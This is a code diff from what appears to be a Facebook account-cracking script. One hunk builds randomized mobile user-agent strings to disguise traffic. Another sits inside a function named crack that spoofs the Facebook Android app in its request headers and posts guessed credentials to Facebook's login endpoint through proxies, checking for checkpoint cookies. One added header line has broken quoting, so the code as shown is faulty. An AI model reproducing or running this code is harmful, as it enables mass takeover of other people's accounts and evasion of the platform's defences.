@@ -123,13 +123,13 @@ for x in range(5000):
 	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
 	aZ10 = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9','0']
 #	A__ = f'Mozilla/5.0 (Linux; U; Android {str(rr(1,10))}.{str(rr(1,10))}.{str(rr(1,10))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
-	A_ = f'Mozilla/5.0 (Linux; U; Android {str(rr(2,18))}; Infinix X6823C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 OPR/63.0.2254.62069'
+	A_ = f'Mozilla/5.0 (Linux; U; Android {str(rr(2,18))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
 #	A_ = f'Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
 	B_ = f'{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}'
 #	B_ = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
 	C_ = f'{str(rr(30,57))} Build/{B_}) AppleWebKit/537.36 (KHTML, like Gecko)'
-	D_ = f' Version/4.0 Chrome/{str(rr(10,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
-	E_ = f'537.36 UCBrowser/{str(rr(2,40))}.7.36.1 U3/0.8.0 mobile safari/533.1 BlackBerry6285/3.3.0.385 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/300'
+	D_ = f' Version/4.0 Chrome/{str(rr(2,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
+	E_ = f'537.36 HeyTapBrowser/{str(rr(2,40))}.7.36.1'
 
 	se = f'{A_}{C_}{D_}{E_}'
 	if se in redmi:pass
@@ -661,14 +661,14 @@ def crack(idf,pwx,url,awal):
 				"content-type":"application/x-www-form-urlencoded",
 				"origin":f"https://{url}",
 				"referer":f"https://{url}/login/?source=auth_switcher",
-				'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not) A Brand";v="99"',
+				f"sec-ch-ua": ""Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"",
 				"sec-ch-ua-mobile": "?0",
 				"sec-fetch-site":"same-origin",
 				"sec-fetch-mode":"cors",
 				"sec-fetch-dest":"empty",
 				"accept-encoding":"gzip, deflate br",
-				"accept-language":"en-US;q=0.9,en;q=0.8",
-				"x-requested-with":"XMLHttpRequest",
+				"accept-language":"ha,en-US;q=0.9,en;q=0.8",
+				"x-requested-with":"com.facebook.katana",
 			}
 			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=hd2, data=date, proxies=proxy)
 			if "checkpoint" in ses.cookies.get_dict():
